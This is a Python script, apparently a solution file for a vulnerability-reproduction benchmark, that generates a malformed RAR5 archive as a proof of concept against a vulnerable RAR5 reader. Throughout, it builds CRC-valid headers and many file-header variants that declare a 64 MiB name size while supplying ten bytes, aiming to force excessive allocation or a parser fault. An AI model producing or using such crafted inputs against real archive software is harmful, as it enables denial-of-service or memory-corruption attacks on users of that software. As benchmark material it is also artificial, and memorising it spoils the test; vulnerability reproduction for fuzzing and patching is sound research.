import os
import binascii


def varint_encode(value: int) -> bytes:
    """Encode an integer using little-endian base-128 varint."""
    if value < 0:
        raise ValueError("varint_encode only supports non-negative integers")
    out = bytearray()
    while True:
        byte = value & 0x7F
        value >>= 7
        if value:
            out.append(byte | 0x80)
        else:
            out.append(byte)
            break
    return bytes(out)


def build_block(block_type: int, block_flags: int, specific_data: bytes) -> bytes:
    """
    Build a generic RAR5-like block:
    [4-byte CRC32 over header_body] [header_body]
    where header_body = varint(size) + varint(type) + varint(flags) + specific_data
    and size == len(header_body)
    """
    header_wo_size = bytearray()
    header_wo_size += varint_encode(block_type)
    header_wo_size += varint_encode(block_flags)
    header_wo_size += specific_data

    # Find a size value such that size == len(varint(size) + header_wo_size)
    size_val = len(header_wo_size) + 1  # initial guess (at least 1 byte for size field)
    while True:
        size_bytes = varint_encode(size_val)
        total_len = len(size_bytes) + len(header_wo_size)
        if total_len == size_val:
            break
        size_val = total_len

    size_bytes = varint_encode(size_val)
    header_body = size_bytes + header_wo_size
    # Sanity check
    if len(header_body) != size_val:
        # Fallback: force consistency even if our assumption is wrong
        size_val = len(header_body)
        size_bytes = varint_encode(size_val)
        header_body = size_bytes + header_wo_size
        # If still inconsistent, just keep as-is; CRC will at least match our bytes
    crc = binascii.crc32(header_body) & 0xFFFFFFFF
    crc_bytes = crc.to_bytes(4, "little")
    return crc_bytes + header_body


def build_main_header() -> bytes:
    """
    Build a minimal RAR5 main header block.
    We assume block_type=1 (MAIN), flags=0, and no specific data.
    """
    block_type_main = 1
    block_flags_main = 0
    specific_data = b""
    return build_block(block_type_main, block_flags_main, specific_data)


def build_file_header_patterns() -> bytes:
    """
    Build multiple candidate RAR5 file header blocks with different layouts
    for the fields preceding the name size, to maximize the chance that one
    matches the vulnerable parser's expectations.
    """
    block_type_file = 2
    block_flags_file = 0  # no extra/data areas, minimal flags

    # Large name size to trigger excessive allocation.
    # 64 MiB is large enough to exceed typical limits but small enough to malloc.
    large_name_size = 1 << 26
    name_size_varint = varint_encode(large_name_size)
    fake_name = b"A" * 10  # we don't actually provide large name data

    blocks = []

    # Patterns vary:
    # - whether we include an initial "file_flags" varint
    # - how many small integer fields we include before name_size
    # All non-name fields are encoded as small, safe values (0 or 1).
    patterns = []

    # With file_flags varint at start
    for prefix_before_name in range(0, 8):
        patterns.append({"has_file_flags": True, "prefix_before_name": prefix_before_name})

    # Without file_flags varint
    for prefix_before_name in range(0, 8):
        patterns.append({"has_file_flags": False, "prefix_before_name": prefix_before_name})

    # A few extra patterns with more prefix fields, in case header is larger
    for prefix_before_name in (8, 10, 12):
        patterns.append({"has_file_flags": True, "prefix_before_name": prefix_before_name})
        patterns.append({"has_file_flags": False, "prefix_before_name": prefix_before_name})

    for pat in patterns:
        specific = bytearray()
        if pat["has_file_flags"]:
            # file_flags: 0 (no special options)
            specific += varint_encode(0)
        # Prefix fields (attributes, sizes, times, etc.), all small values
        for _ in range(pat["prefix_before_name"]):
            specific += varint_encode(1)
        # Name size field
        specific += name_size_varint
        # Actual name data (much smaller than declared)
        specific += fake_name

        block = build_block(block_type_file, block_flags_file, bytes(specific))
        blocks.append(block)

    return b"".join(blocks)


class Solution:
    def solve(self, src_path: str) -> bytes:
        # Construct a RAR5-like archive designed to exercise the vulnerable RAR5 reader.
        magic_rar5 = b"Rar!\x1a\x07\x01\x00"
        main_header = build_main_header()
        file_headers = build_file_header_patterns()
        poc = magic_rar5 + main_header + file_headers
        return poc
